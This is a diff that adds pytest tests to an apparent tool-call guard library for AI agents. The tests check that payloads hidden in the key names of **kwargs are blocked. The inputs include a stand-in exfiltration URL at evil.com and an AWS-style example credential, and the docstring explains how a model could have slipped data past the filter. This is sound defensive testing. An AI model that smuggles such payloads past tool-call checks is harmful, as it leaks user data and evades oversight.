@@ -164,3 +164,78 @@ class TestAsyncTools:
 
         with pytest.raises(ModelFuzzBlockError):
             asyncio.run(collect())
+
+
+class TestUndeclaredKwargKeysAreChecked:
+    """A tool declaring **kwargs lets the caller choose the key names.
+
+    _enforce iterated kwargs.values() only, so for any tool with a **kwargs
+    parameter the entire payload could be smuggled in the key -- and JSON
+    permits arbitrary keys, so a model can emit one. The same dict passed as a
+    *value* was blocked, which is what made the gap invisible.
+    """
+
+    def test_a_url_in_an_undeclared_kwarg_key_is_blocked(self):
+        from modelfuzz import ModelFuzzBlockError, PolicyEngine, URLAllowList, shield_tool
+
+        engine = PolicyEngine([URLAllowList(allowed_domains=["api.internal.com"])])
+        ran = []
+
+        @shield_tool(engine=engine)
+        def http_get(**params: object) -> str:
+            ran.append(params)
+            return "ran"
+
+        with pytest.raises(ModelFuzzBlockError):
+            http_get(**{"http://evil.com/exfil?d=1": "x"})
+        assert ran == []
+
+    def test_a_credential_in_an_undeclared_kwarg_key_is_blocked(self):
+        from modelfuzz import ModelFuzzBlockError, PolicyEngine, SecretPatternFilter, shield_tool
+
+        engine = PolicyEngine([SecretPatternFilter()])
+
+        @shield_tool(engine=engine)
+        def db_query(table: str, **filters: object) -> str:
+            return "ran"
+
+        with pytest.raises(ModelFuzzBlockError):
+            db_query("users", **{"AKIA" + "IOSFODNN7EXAMPLE": 1})
+
+    def test_declared_parameter_names_are_not_checked(self):
+        """The tool author picks these, not the model.
+
+        Checking them would make the bundled SensitiveDataFilter block any tool
+        that merely has a parameter called `password` or `api_key`.
+        """
+        from modelfuzz import shield_tool
+
+        @shield_tool()
+        def login(password: str = "", api_key: str = "") -> str:
+            return "ran"
+
+        assert login(password="x", api_key="y") == "ran"
+
+    def test_ordinary_undeclared_keys_still_pass(self):
+        from modelfuzz import PolicyEngine, URLAllowList, shield_tool
+
+        engine = PolicyEngine([URLAllowList(allowed_domains=["api.internal.com"])])
+
+        @shield_tool(engine=engine)
+        def http_get(**params: object) -> str:
+            return "ran"
+
+        assert http_get(limit=10, order="asc") == "ran"
+
+    def test_values_are_still_checked(self):
+        """The pre-existing behaviour must be untouched."""
+        from modelfuzz import ModelFuzzBlockError, PolicyEngine, URLAllowList, shield_tool
+
+        engine = PolicyEngine([URLAllowList(allowed_domains=["api.internal.com"])])
+
+        @shield_tool(engine=engine)
+        def http_get(**params: object) -> str:
+            return "ran"
+
+        with pytest.raises(ModelFuzzBlockError):
+            http_get(callback="http://evil.com")
